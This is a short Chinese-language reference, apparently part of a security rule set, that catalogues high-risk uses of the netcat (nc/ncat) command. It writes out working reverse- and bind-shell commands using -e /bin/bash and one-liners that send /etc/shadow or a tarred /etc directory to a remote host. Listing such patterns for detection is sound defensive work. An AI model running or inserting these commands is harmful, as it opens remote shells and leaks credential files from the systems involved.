# nc / ncat 命令安全风险

## 涉及的安全问题
- 命令注入（-e 执行命令）
- 上传下载（反向连接、数据传输）

## 高危模式

### 命令注入 — 反向 shell
```bash
nc "$USER_HOST" "$USER_PORT" -e /bin/bash
# 直接建立反向 shell

nc -l -p "$PORT" -e /bin/bash
# 监听端口，连接时执行 shell
```

### 上传下载 — 数据传输
```bash
# 发送文件
nc "$USER_HOST" "$PORT" < /etc/shadow
# 将敏感文件发送到远程

# 接收文件
nc -l -p "$PORT" > "$USER_OUTPUT"
# 接收远程数据写入任意路径

# 管道传输
cat /etc/shadow | nc "$USER_HOST" "$PORT"
tar czf - /etc | nc "$USER_HOST" "$PORT"
# 打包敏感目录并发送
```
